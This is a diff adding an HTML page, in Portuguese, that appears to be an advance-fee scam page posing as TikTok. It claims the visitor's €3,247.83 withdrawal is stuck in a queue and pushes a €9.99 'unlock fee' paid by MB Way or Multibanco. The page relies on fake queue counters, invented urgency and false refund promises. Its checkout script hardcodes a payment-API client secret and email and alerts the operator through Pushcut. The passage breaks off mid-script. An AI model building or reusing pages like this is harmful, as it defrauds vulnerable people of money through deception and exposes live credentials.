@@ -1,0 +1,929 @@
+<!DOCTYPE html><html lang="pt-PT"><head>
+  <meta charset="UTF-8">
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-xcod-sck
+    data-utmify-prevent-subids
+    async
+    defer
+  ></script>
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+  ttq.load('D4CD623C77UCD4LDVC2G');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TikTok | Antecipacao Prioritaria</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <link rel="shortcut icon" href="../up1/images/tiktok1689.jpg">
+
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: #f0f2f5;
+      color: #1a1a1a;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 0 0 30px;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* ANIMATIONS */
+    @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+    @keyframes fadeInScale { from { opacity: 0; transform: scale(0.85); } to { opacity: 1; transform: scale(1); } }
+    @keyframes slideInLeft { from { opacity: 0; transform: translateX(-25px); } to { opacity: 1; transform: translateX(0); } }
+    @keyframes bounceIn { 0% { opacity: 0; transform: scale(0.3); } 50% { opacity: 1; transform: scale(1.08); } 70% { transform: scale(0.95); } 100% { transform: scale(1); } }
+    @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }
+    @keyframes shimmer { 0% { background-position: -200% center; } 100% { background-position: 200% center; } }
+    @keyframes pulseGlow { 0%, 100% { box-shadow: 0 0 5px rgba(109,40,217,0.2); } 50% { box-shadow: 0 0 20px rgba(109,40,217,0.4); } }
+    @keyframes ctaPulse { 0%, 100% { box-shadow: 0 12px 30px rgba(220,38,38,0.35); transform: scale(1); } 50% { box-shadow: 0 16px 40px rgba(220,38,38,0.6); transform: scale(1.03); } }
+    @keyframes checkPop { 0% { opacity: 0; transform: scale(0); } 60% { transform: scale(1.3); } 100% { opacity: 1; transform: scale(1); } }
+    @keyframes fadeInBlur { from { opacity: 0; filter: blur(8px); } to { opacity: 1; filter: blur(0); } }
+    @keyframes gradientShift { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      10%, 30%, 50%, 70%, 90% { transform: translateX(-4px); }
+      20%, 40%, 60%, 80% { transform: translateX(4px); }
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+    @keyframes toastIn {
+      from { transform: translateX(120%); opacity: 0; }
+      to { transform: translateX(0); opacity: 1; }
+    }
+    @keyframes toastOut {
+      from { transform: translateX(0); opacity: 1; }
+      to { transform: translateX(120%); opacity: 0; }
+    }
+    @keyframes slideDown {
+      from { transform: translateY(-100%); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+    @keyframes queueDrop {
+      0% { transform: translateY(-20px); opacity: 0; color: #dc2626; }
+      50% { transform: translateY(5px); opacity: 1; }
+      100% { transform: translateY(0); opacity: 1; color: #6d28d9; }
+    }
+    @keyframes barShrink {
+      from { width: 100%; }
+      to { width: 0%; }
+    }
+    @keyframes pulseRed {
+      0%, 100% { background: #dc2626; }
+      50% { background: #991b1b; }
+    }
+
+    /* WARNING BAR */
+    .warning-bar {
+      position: sticky;
+      top: 0;
+      width: 100%;
+      background: linear-gradient(90deg, #312e81, #4c1d95, #312e81);
+      background-size: 200% 100%;
+      animation: slideDown 0.5s ease both, gradientShift 4s ease infinite;
+      color: #fff;
+      text-align: center;
+      padding: 12px 16px;
+      font-size: 13px;
+      font-weight: 700;
+      letter-spacing: 0.3px;
+      z-index: 500;
+      box-shadow: 0 4px 20px rgba(49,46,129,0.4);
+    }
+    .warning-bar span { color: #fbbf24; }
+
+    /* CARD */
+    .card {
+      background: #ffffff;
+      border-radius: 20px;
+      border-top: 4px solid #6d28d9;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.08);
+      max-width: 420px;
+      width: 92%;
+      padding: 30px 22px 28px;
+      text-align: center;
+      animation: fadeInUp 0.6s cubic-bezier(0.22,1,0.36,1) both;
+      margin-top: 20px;
+    }
+
+    /* QUEUE DISPLAY */
+    .queue-display {
+      background: linear-gradient(135deg, #faf5ff, #ede9fe);
+      border: 2px solid #c4b5fd;
+      border-radius: 16px;
+      padding: 20px;
+      margin-bottom: 18px;
+      animation: fadeInScale 0.5s ease 0.3s both;
+    }
+    .queue-display .queue-label {
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      color: #6d28d9;
+      font-weight: 700;
+      margin-bottom: 6px;
+    }
+    .queue-display .queue-number {
+      font-size: 52px;
+      font-weight: 900;
+      color: #6d28d9;
+      line-height: 1;
+      animation: queueDrop 0.4s ease;
+      text-shadow: 0 2px 8px rgba(109,40,217,0.2);
+    }
+    .queue-display .queue-sub {
+      font-size: 12px;
+      color: #7c3aed;
+      font-weight: 600;
+      margin-top: 6px;
+    }
+
+    .icon-main {
+      font-size: 48px;
+      margin-bottom: 12px;
+      display: block;
+      animation: bounceIn 0.8s cubic-bezier(0.22,1,0.36,1) 0.2s both, float 3s ease-in-out 1.5s infinite;
+    }
+
+    .card-title {
+      font-size: 22px;
+      font-weight: 900;
+      color: #4c1d95;
+      margin-bottom: 8px;
+      letter-spacing: -0.02em;
+      text-transform: uppercase;
+      animation: fadeInBlur 0.7s ease 0.4s both;
+    }
+
+    .card-subtitle {
+      font-size: 13px;
+      color: #444;
+      margin-bottom: 20px;
+      line-height: 1.55;
+      animation: fadeInUp 0.6s ease 0.5s both;
+    }
+
+    /* TIME COMPARISON */
+    .time-card {
+      background: #fefce8;
+      border: 2px solid #fde68a;
+      border-radius: 14px;
+      padding: 18px;
+      margin-bottom: 18px;
+      animation: fadeInScale 0.5s ease 0.6s both;
+    }
+    .time-comparison {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 14px;
+      margin-bottom: 12px;
+    }
+    .time-box {
+      text-align: center;
+      padding: 14px 18px;
+      border-radius: 12px;
+      animation: fadeInScale 0.5s ease both;
+      flex: 1;
+    }
+    .time-box.old {
+      background: #fef2f2;
+      border: 2px solid #fca5a5;
+      animation-delay: 0.8s;
+    }
+    .time-box.new {
+      background: #f0fdf4;
+      border: 2px solid #86efac;
+      animation-delay: 1.0s;
+    }
+    .time-box .time-label {
+      font-size: 10px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: #888;
+      font-weight: 600;
+      margin-bottom: 4px;
+    }
+    .time-box.old .time-value {
+      font-size: 20px;
+      font-weight: 900;
+      color: #dc2626;
+      text-decoration: line-through;
+    }
+    .time-box.new .time-value {
+      font-size: 20px;
+      font-weight: 900;
+      color: #16a34a;
+    }
+    .time-arrow {
+      font-size: 24px;
+      color: #6d28d9;
+      font-weight: 900;
+      animation: fadeInScale 0.5s ease 0.9s both;
+    }
+    .time-note {
+      font-size: 12px;
+      color: #92400e;
+      font-weight: 700;
+      line-height: 1.5;
+    }
+
+    /* PROGRESS QUEUE BAR */
+    .progress-queue {
+      background: #f5f3ff;
+      border: 1px solid #ddd6fe;
+      border-radius: 12px;
+      padding: 14px;
+      margin-bottom: 18px;
+      animation: fadeInUp 0.5s ease 1.0s both;
+    }
+    .progress-queue .pq-label {
+      font-size: 11px;
+      font-weight: 700;
+      color: #6d28d9;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 8px;
+    }
+    .progress-queue .pq-bar-bg {
+      background: #e5e7eb;
+      border-radius: 8px;
+      height: 14px;
+      overflow: hidden;
+      position: relative;
+    }
+    .progress-queue .pq-bar-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #dc2626, #f97316);
+      border-radius: 8px;
+      transition: width 1s ease;
+      animation: pulseRed 2s ease infinite;
+    }
+    .progress-queue .pq-warning {
+      font-size: 11px;
+      color: #dc2626;
+      font-weight: 700;
+      margin-top: 8px;
+      animation: blink 1.5s ease infinite;
+    }
+
+    /* CHECKLIST */
+    .checklist {
+      background: #f9fafb;
+      border: 1px solid #e5e7eb;
+      border-radius: 14px;
+      padding: 14px 18px;
+      text-align: left;
+      margin-bottom: 18px;
+      animation: fadeInScale 0.5s ease 1.2s both;
+    }
+    .checklist-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 7px 0;
+      font-size: 13px;
+      font-weight: 600;
+      color: #1a1a1a;
+      animation: slideInLeft 0.5s ease both;
+    }
+    .checklist-item:nth-child(1) { animation-delay: 1.4s; }
+    .checklist-item:nth-child(2) { animation-delay: 1.6s; }
+    .checklist-item:nth-child(3) { animation-delay: 1.8s; }
+    .checklist-item:nth-child(4) { animation-delay: 2.0s; }
+
+    .checklist-item .check {
+      font-size: 16px;
+      flex-shrink: 0;
+      animation: checkPop 0.4s ease both;
+    }
+    .checklist-item:nth-child(1) .check { animation-delay: 1.6s; color: #16a34a; }
+    .checklist-item:nth-child(2) .check { animation-delay: 1.8s; color: #16a34a; }
+    .checklist-item:nth-child(3) .check { animation-delay: 2.0s; color: #16a34a; }
+    .checklist-item:nth-child(4) .check { animation-delay: 2.2s; color: #dc2626; }
+
+    .checklist-item.blocked {
+      color: #dc2626;
+      font-weight: 800;
+      animation: blink 1.8s ease-in-out infinite;
+    }
+
+    .info-text {
+      font-size: 12px;
+      color: #555;
+      margin-bottom: 16px;
+      line-height: 1.6;
+      animation: fadeInUp 0.5s ease 2.4s both;
+      background: #fff7ed;
+      border: 1px solid #fed7aa;
+      border-radius: 10px;
+      padding: 12px 14px;
+    }
+    .info-text strong { color: #c2410c; }
+
+    .amount-badge {
+      background: linear-gradient(135deg, #faf5ff, #f5f3ff);
+      border: 2px solid #c4b5fd;
+      border-radius: 14px;
+      padding: 18px;
+      margin-bottom: 18px;
+      animation: fadeInUp 0.5s ease 2.2s both, pulseGlow 3s ease-in-out 3s infinite;
+    }
+    .amount-badge-label {
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      color: #6d28d9;
+      font-weight: 700;
+      margin-bottom: 4px;
+    }
+    .amount-badge-value {
+      font-size: 32px;
+      font-weight: 900;
+      color: #4c1d95;
+    }
+
+    .cta-button {
+      display: block;
+      width: 100%;
+      border: none;
+      border-radius: 14px;
+      padding: 18px 20px;
+      font-size: 15px;
+      font-weight: 900;
+      color: #fff;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      background: linear-gradient(90deg, #dc2626, #b91c1c, #dc2626);
+      background-size: 200% 100%;
+      cursor: pointer;
+      box-shadow: 0 12px 30px rgba(220,38,38,0.35);
+      transition: all 0.3s ease;
+      font-family: inherit;
+      animation: fadeInUp 0.6s ease 2.6s both, ctaPulse 2s ease-in-out 3.5s infinite, gradientShift 3s ease infinite;
+      position: relative;
+      overflow: hidden;
+    }
+    .cta-button::after {
+      content: '';
+      position: absolute;
+      top: 0; left: -100%;
+      width: 100%; height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
+      animation: shimmer 2s ease-in-out 3.5s infinite;
+    }
+    .cta-button:hover { transform: translateY(-2px) scale(1.02); box-shadow: 0 16px 40px rgba(220,38,38,0.5); }
+    .cta-button:active { transform: translateY(0) scale(0.98); }
+
+    .sub-cta {
+      font-size: 12px;
+      color: #dc2626;
+      font-weight: 700;
+      margin-top: 10px;
+      animation: blink 2s ease-in-out infinite;
+    }
+
+    .disclaimer {
+      font-size: 10px;
+      color: #999;
+      margin-top: 14px;
+      line-height: 1.5;
+      animation: fadeInUp 0.4s ease 3.0s both;
+    }
+
+    /* TOAST NOTIFICATIONS */
+    .toast-container {
+      position: fixed;
+      top: 60px;
+      right: 12px;
+      z-index: 900;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      max-width: 320px;
+    }
+    .toast {
+      background: #fff;
+      border-left: 4px solid #16a34a;
+      border-radius: 10px;
+      padding: 12px 16px;
+      box-shadow: 0 6px 24px rgba(0,0,0,0.15);
+      font-size: 12px;
+      font-weight: 600;
+      color: #1a1a1a;
+      animation: toastIn 0.4s ease both;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .toast.exit { animation: toastOut 0.4s ease both; }
+    .toast .toast-icon { font-size: 18px; flex-shrink: 0; }
+
+    /* Checkout Modal */
+    .checkout-overlay {
+      display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0); z-index: 1000; justify-content: center; align-items: center; transition: background 0.3s ease;
+    }
+    .checkout-overlay.active { display: flex; background: rgba(0,0,0,0.5); }
+    .checkout-modal {
+      background: #fff; border-radius: 18px; padding: 25px 20px; width: 92%; max-width: 420px; max-height: 90vh;
+      overflow-y: auto; position: relative; box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+      animation: fadeInScale 0.4s cubic-bezier(0.22,1,0.36,1) both;
+    }
+    .checkout-modal-close { position: absolute; top: 12px; right: 15px; background: none; border: none; font-size: 24px; cursor: pointer; color: #999; transition: transform 0.2s ease; }
+    .checkout-modal-close:hover { transform: rotate(90deg); }
+    .checkout-modal h2 { margin-bottom: 15px; font-size: 18px; font-weight: 800; text-align: center; }
+    .summary-item { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #eee; font-size: 14px; }
+    .summary-item.total { font-weight: 700; font-size: 16px; border-bottom: none; }
+    .payment-method-options { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 15px 0; }
+    .payment-method-option { cursor: pointer; }
+    .payment-method-option input { display: none; }
+    .method-card {
+      display: flex; flex-direction: column; align-items: center; gap: 6px;
+      padding: 14px 10px; border: 2px solid #e5e7eb; border-radius: 14px;
+      transition: all 0.25s ease; font-size: 13px; font-weight: 700; background: #fff;
+    }
+    .payment-method-option input:checked + .method-card { border-color: #6d28d9; background: #faf5ff; box-shadow: 0 0 0 1px #6d28d9; transform: scale(1.02); }
+    .method-card img { height: 30px; width: auto; object-fit: contain; }
+    .phone-input-wrapper { display: flex; border: 2px solid #d0d5dd; border-radius: 12px; overflow: hidden; margin-top: 8px; transition: all 0.3s ease; }
+    .phone-input-wrapper:focus-within { border-color: #6d28d9; box-shadow: 0 0 0 3px rgba(109,40,217,0.1); }
+    .country-code { display: flex; align-items: center; gap: 6px; padding: 0 12px; background: #f9fafb; border-right: 1px solid #d0d5dd; font-size: 14px; font-weight: 600; height: 48px; }
+    .country-code .flag { width: 22px; height: 15px; object-fit: cover; border-radius: 2px; }
+    .phone-input-wrapper input { flex: 1; border: none; padding: 0 14px; font-size: 15px; outline: none; height: 48px; font-family: inherit; background: transparent; }
+    #phone-section { margin: 10px 0; }
+    #phone-section h3 { font-size: 14px; margin-bottom: 4px; font-weight: 700; }
+    .checkout-submit-btn {
+      width: 100%; padding: 14px; background: linear-gradient(90deg, #dc2626 0%, #b91c1c 100%);
+      color: #fff; border: none; border-radius: 14px; font-size: 16px; font-weight: 800;
+      cursor: pointer; margin-top: 10px; font-family: inherit;
+      box-shadow: 0 12px 30px rgba(220,38,38,0.3); transition: all 0.3s ease;
+    }
+    .checkout-submit-btn:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 16px 40px rgba(220,38,38,0.45); }
+    .checkout-submit-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+    .checkout-info { margin-top: 12px; font-size: 12px; color: #666; text-align: center; }
+    .checkout-info p { margin-bottom: 4px; font-weight: 600; }
+    .copy-ref-btn { width: 100%; padding: 12px; background: #1d2939; color: #fff; border: none; border-radius: 12px; font-size: 14px; font-weight: 700; cursor: pointer; margin-top: 10px; transition: all 0.2s ease; font-family: inherit; }
+    .copy-ref-btn:hover { background: #344054; transform: translateY(-1px); }
+    .copy-ref-btn.copied { background: #16a34a; }
+    .payment-instructions { text-align: center; }
+    .payment-instructions h2 { margin-bottom: 10px; font-weight: 800; }
+    .amount-display { font-size: 28px; font-weight: 900; color: #dc2626; margin: 10px 0; }
+    .multibanco-reference { background: #f8f9fa; border-radius: 12px; padding: 15px; margin: 15px 0; text-align: left; }
+    .reference-item { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #eee; font-size: 14px; }
+    .reference-item:last-child { border-bottom: none; }
+    .reference-label { color: #666; }
+    .reference-value { font-weight: 700; }
+    .mbway-info { background: #f8f9fa; border-radius: 12px; padding: 15px; margin: 15px 0; }
+    .info-row { display: flex; justify-content: space-between; padding: 6px 0; font-size: 14px; }
+    .mbway-steps { text-align: left; margin: 15px 0; }
+    .step-item { display: flex; align-items: center; gap: 10px; padding: 8px 0; }
+    .step-number { width: 28px; height: 28px; background: #dc2626; color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 13px; flex-shrink: 0; }
+    .step-text { font-size: 13px; font-weight: 600; }
+    .mbway-warning { background: #fff3cd; border: 1px solid #ffc107; padding: 12px; border-radius: 10px; font-size: 12px; color: #856404; margin: 10px 0; }
+    .waiting-message { display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 15px; padding: 14px; background: #f0fdf4; border-radius: 12px; font-size: 14px; color: #166534; font-weight: 700; }
+    .spinner { width: 20px; height: 20px; border: 3px solid #bbf7d0; border-top-color: #16a34a; border-radius: 50%; animation: spin 0.8s linear infinite; }
+    .payment-success { text-align: center; padding: 30px 20px; }
+    .payment-success h2 { color: #16a34a; margin: 15px 0 5px; font-weight: 800; }
+    .payment-error-msg { background: #fef2f2; color: #dc2626; padding: 10px; border-radius: 10px; font-size: 13px; margin-bottom: 10px; text-align: center; font-weight: 600; animation: fadeInScale 0.3s ease both; }
+    .error-badge { text-align: center; margin: 15px 0; }
+    .error-message { color: #dc2626; font-weight: 700; }
+  </style>
+</head>
+
+<body>
+
+  <!-- WARNING BAR -->
+  <div class="warning-bar">A TUA POSICAO NA FILA ESTA A DESCER — <span>Age agora ou espera 45 dias</span></div>
+
+  <!-- TOAST CONTAINER -->
+  <div class="toast-container" id="toast-container"></div>
+
+  <div class="card">
+
+    <!-- QUEUE POSITION DISPLAY -->
+    <div class="queue-display">
+      <div class="queue-label">A tua posicao na fila de espera</div>
+      <div class="queue-number" id="queue-number">#847</div>
+      <div class="queue-sub" id="queue-sub">A descer... pessoas estao a passar a tua frente</div>
+    </div>
+
+    <span class="icon-main">&#9203;</span>
+
+    <h1 class="card-title">O TEU DINHEIRO ESTA PRESO</h1>
+    <p class="card-subtitle">O teu levantamento foi aprovado, mas esta preso numa fila de <strong>milhares de pessoas</strong>. Tempo normal de espera: <strong>45 dias uteis</strong>. Cada minuto que perdes, mais pessoas pagam a taxa e passam a tua frente. Quem paga, salta para o inicio.</p>
+
+    <!-- TIME COMPARISON -->
+    <div class="time-card">
+      <div class="time-comparison">
+        <div class="time-box old">
+          <div class="time-label">Fila normal</div>
+          <div class="time-value">45 DIAS</div>
+        </div>
+        <div class="time-arrow">&#10132;</div>
+        <div class="time-box new">
+          <div class="time-label">Com desbloqueio</div>
+          <div class="time-value">5 MIN</div>
+        </div>
+      </div>
+      <p class="time-note">&#9888;&#65039; Cada pessoa que paga a taxa salta a tua frente. A tua posicao esta a cair NESTE MOMENTO.</p>
+    </div>
+
+    <!-- PROGRESS QUEUE BAR -->
+    <div class="progress-queue">
+      <div class="pq-label">A tua posicao na fila</div>
+      <div class="pq-bar-bg">
+        <div class="pq-bar-fill" id="pq-bar-fill" style="width: 85%;"></div>
+      </div>
+      <div class="pq-warning" id="pq-warning">&#9888; Estao a passar pessoas a tua frente agora mesmo</div>
+    </div>
+
+    <!-- STATUS CHECKLIST -->
+    <div class="checklist">
+      <div class="checklist-item"><span class="check">&#10004;&#65039;</span><span>Levantamento aprovado</span></div>
+      <div class="checklist-item"><span class="check">&#10004;&#65039;</span><span>Montante confirmado: &#8364;3.247,83</span></div>
+      <div class="checklist-item"><span class="check">&#10004;&#65039;</span><span>Conta bancaria verificada</span></div>
+      <div class="checklist-item blocked"><span class="check">&#10060;</span><span>BLOQUEADO: posicao <strong id="queue-inline">#847</strong> na fila</span></div>
+    </div>
+
+    <!-- INFO TEXT -->
+    <p class="info-text">Cada pessoa que paga a taxa passa a tua frente. Ja passaram <strong id="people-skipped">14</strong> pessoas nos ultimos 5 minutos. Se nao agires agora, podes esperar <strong>SEMANAS</strong> sem qualquer previsao de quando o teu dinheiro sera libertado.</p>
+
+    <!-- AMOUNT -->
+    <div class="amount-badge">
+      <div class="amount-badge-label">Taxa de desbloqueio e antecipacao imediata</div>
+      <div class="amount-badge-value">&#8364;9,99</div>
+    </div>
+
+    <!-- CTA -->
+    <button class="cta-button" id="open-checkout-btn">SALTAR A FILA E RECEBER EM 5 MINUTOS</button>
+
+    <p class="sub-cta" id="sub-cta-text">&#9889; 7 pessoas saltaram a fila nos ultimos 10 minutos</p>
+
+    <p class="disclaimer">Sem o desbloqueio, o teu saldo permanece retido durante 45 dias uteis sem possibilidade de acesso antecipado. A taxa e reembolsavel.</p>
+  </div>
+
+  <!-- Checkout Modal -->
+  <div class="checkout-overlay" id="checkout-overlay">
+    <div class="checkout-modal">
+      <button class="checkout-modal-close" id="checkout-close">&times;</button>
+      <div id="checkout-content">
+        <h2>Desbloqueio de Fila</h2>
+        <div class="summary-item"><span>Taxa de desbloqueio:</span><strong id="display-amount"></strong></div>
+        <div class="summary-item total"><span>Total a pagar:</span><strong id="display-total"></strong></div>
+
+        <form id="checkout-form">
+          <div>
+            <h3 style="font-size:14px; margin:15px 0 5px; font-weight:700;">Metodo de Pagamento</h3>
+            <div class="payment-method-options">
+              <label class="payment-method-option">
+                <input type="radio" name="payment-method" value="mbway">
+                <div class="method-card">
+                  <img src="../up1/images/logombway.png" alt="MB Way">
+                  <span>MB Way</span>
+                </div>
+              </label>
+              <label class="payment-method-option">
+                <input type="radio" name="payment-method" value="multibanco" checked>
+                <div class="method-card">
+                  <img src="../up1/images/logoiban.png" alt="Multibanco">
+                  <span>Multibanco</span>
+                </div>
+              </label>
+            </div>
+          </div>
+
+          <div id="phone-section" style="display:none;">
+            <h3>Telefone MB Way</h3>
+            <div class="phone-input-wrapper">
+              <div class="country-code">
+                <img class="flag" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Flag_of_Portugal.svg/1280px-Flag_of_Portugal.svg.png" alt="PT">
+                <span class="code">+351</span>
+              </div>
+              <input type="tel" id="payer-phone" placeholder="912345678" maxlength="9" pattern="[0-9]*" inputmode="numeric" autocomplete="off" required>
+            </div>
+          </div>
+
+          <button type="submit" class="checkout-submit-btn" id="checkout-submit-btn">Pagar</button>
+
+          <div class="checkout-info">
+            <p>O teu pagamento e seguro e protegido</p>
+            <p>O valor sera reembolsado em 1 minuto</p>
+          </div>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <script>
+  (function(){
+    var WAYMB = {
+      baseUrl: 'https://api.waymb.com',
+      clientId: 'luiz_67b87cca',
+      clientSecret: '1fcd4608-41f1-4bfe-8b6e-ce195cc5c1fb',
+      accountEmail: 'dl.ads0001@gmail.com'
+    };
+    var AMOUNT = 9.99;
+    var CURRENCY = 'EUR';
+    var SUCCESS_URL = location.origin + '/up6/';
+
+    var overlay = document.getElementById('checkout-overlay');
+    var content = document.getElementById('checkout-content');
+    var form = document.getElementById('checkout-form');
+    var submitBtn = document.getElementById('checkout-submit-btn');
+    var phoneSection = document.getElementById('phone-section');
+    var phoneInput = document.getElementById('payer-phone');
+    var methodInputs = document.querySelectorAll('input[name="payment-method"]');
+
+    document.getElementById('display-amount').textContent = '\u20AC' + AMOUNT.toFixed(2);
+    document.getElementById('display-total').textContent = '\u20AC' + AMOUNT.toFixed(2);
+    submitBtn.textContent = 'Pagar \u20AC' + AMOUNT.toFixed(2);
+
+    document.getElementById('open-checkout-btn').addEventListener('click', function(){
+      overlay.classList.add('active');
+      try { if(typeof ttq!=='undefined' && typeof ttq.track==='function') ttq.track('InitiateCheckout', { content_type:'product', content_id:'up5_antecipacao', content_name:'Taxa Antecipacao UP5', value:AMOUNT, currency:CURRENCY, quantity:1 }); } catch(_){}
+    });
+    document.getElementById('checkout-close').addEventListener('click', function(){ overlay.classList.remove('active'); });
+    overlay.addEventListener('click', function(e){ if(e.target === overlay) overlay.classList.remove('active'); });
+
+    function togglePhone(){
+      var m = document.querySelector('input[name="payment-method"]:checked');
+      phoneSection.style.display = m && m.value === 'mbway' ? 'block' : 'none';
+      if(phoneInput) phoneInput.required = m && m.value === 'mbway';
+    }
+    methodInputs.forEach(function(inp){ inp.addEventListener('change', togglePhone); });
+    togglePhone();
+
+    if(phoneInput){
+      phoneInput.addEventListener('input', function(e){ e.target.value = e.target.value.replace(/\D/g,''); });
+    }
+
+    function notifyPushcut(method, amount, txId){
+      try { fetch('https://api.pushcut.io/RHm0FW4CoPcGO6IUEjZyL/notifications/Pendente', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ title:'Novo Pagamento Pendente', text:'Metodo: '+method.toUpperCase()+' | Valor: \u20AC'+Number(amount).toFixed(2)+' | Pagina: UP5 | TX: '+(txId||'N/A') }) }).catch(function(){}); } catch(_){}
+    }
+
+    var isSubmitting = false;
+    form.addEventListener('submit', async function(e){
+      e.preventDefault();
+      if(isSubmitting) return;
+      var sel = document.querySelector('input[name="payment-method"]:checked');
+      if(!sel){ showError('Seleciona um metodo de pagamento.'); return; }
+      var method = sel.value;
+      var phone = phoneInput ? phoneInput.value.trim() : '';
+
+      if(method === 'mbway' && phone.length < 9){
+        showError('Telefone invalido. Deve ter 9 digitos.');
+        return;
+      }
+
+      isSubmitting = true;
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'A processar...';
+
+      try {
+        var res = await fetch(WAYMB.baseUrl + '/transactions/create', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            client_id: WAYMB.clientId,
+            client_secret: WAYMB.clientSecret,
+            account_email: WAYMB.accountEmail,
+            amount: AMOUNT,
+            method: method,
+            payer: {
+              email: WAYMB.accountEmail,
+              name: 'Cliente',
+              document: '000000000',
+              phone: method === 'mbway' ? '+351' + phone : '912345678'
+            },
+            currency: CURRENCY,
+            success_url: SUCCESS_URL,
+            failed_url: location.href + '?payment=failed'
+          })
+        });
+        if(!res.ok){
+          var errData = null; try { errData = await res.json(); } catch(_){}
+          throw new Error((errData && (errData.message || errData.error)) || 'Erro ao criar transacao. Tenta novamente.');
+        }
+        var tx = await res.json();
+        var txId = tx.id || tx.transactionID;
+        notifyPushcut(method, AMOUNT, txId);
+        showInstructions(tx, method, phone);
+        startPolling(txId);
+      } catch(err) {
+        showError(err.message || 'Erro ao processar pagamento.');
+        isSubmitting = false;
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Pagar \u20AC' + AMOUNT.toFixed(2);
+      }
+    });
+
+    function showError(msg){
+      var existing = content.querySelector('.payment-error-msg');
+      if(existing) existing.remove();
+      var div = document.createElement('div');
+      div.className = 'payment-error-msg';
+      div.textContent = msg;
+      content.insertBefore(div, content.firstChild);
+      setTimeout(function(){ div.remove(); }, 5000);
+    }
+
+    function showInstructions(tx, method, phone){
+      if(method === 'mbway'){
+        content.innerHTML = '<div class="payment-instructions"><h2>Cobranca MB Way Gerada</h2><div class="amount-display">\u20AC' + AMOUNT.toFixed(2) + '</div>'
+          + '<div class="mbway-instructions">'
+          + '<p style="font-weight:600;">Abre a app MB Way no teu telemovel e aprova o pagamento.</p>'
+          + '<div class="mbway-info"><div class="info-row"><span>Telefone:</span><strong>+351' + phone + '</strong></div>'
+          + '<div class="info-row"><span>Valor:</span><strong>\u20AC' + AMOUNT.toFixed(2) + '</strong></div></div>'
+          + '<div class="mbway-steps">'
+          + '<div class="step-item"><div class="step-number">1</div><div class="step-text">Abre a app MB Way no teu telemovel</div></div>'
+          + '<div class="step-item"><div class="step-number">2</div><div class="step-text">Verifica a notificacao de pagamento pendente</div></div>'
+          + '<div class="step-item"><div class="step-number">3</div><div class="step-text">Aprova o pagamento de \u20AC' + AMOUNT.toFixed(2) + '</div></div>'
+          + '</div>'
+          + '<div class="mbway-warning"><p><strong>Importante:</strong> Se nao receberes a notificacao, verifica se o numero esta correto e se tens MB Way ativado.</p></div>'
+          + '<div class="waiting-message"><div class="spinner"></div><p>A aguardar aprovacao...</p></div>'
+          + '</div></div>';
+      } else if(method === 'multibanco' && tx.referenceData){
